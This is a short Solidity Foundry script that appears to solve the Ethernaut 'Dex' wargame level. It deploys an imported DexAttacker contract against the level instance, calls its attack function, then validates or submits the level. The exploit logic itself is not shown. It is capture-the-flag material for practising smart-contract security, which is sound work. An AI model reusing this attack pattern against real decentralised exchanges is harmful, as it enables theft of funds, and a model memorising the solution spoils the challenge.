// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../utils/Ethernaut.sol";
import "./Dex.sol";
import "./DexAttacker.sol";

contract DexSolver is Test, Ethernaut {
    function run() public {
        IS_TEST = false;
        test();
    }

    function test() public broadcasted {
        Dex instance = Dex(getLevelInstanceFromEntry(Levels.dex, 11));
        DexAttacker attacker = new DexAttacker(address(instance));

        instance.approve(address(attacker), 10);
        attacker.attack();

        if (IS_TEST) {
            require(validateLevelInstance(Levels.dex, address(instance)), "no validation");
        } else {
            submitLevelInstance(address(instance));
        }
    }
}
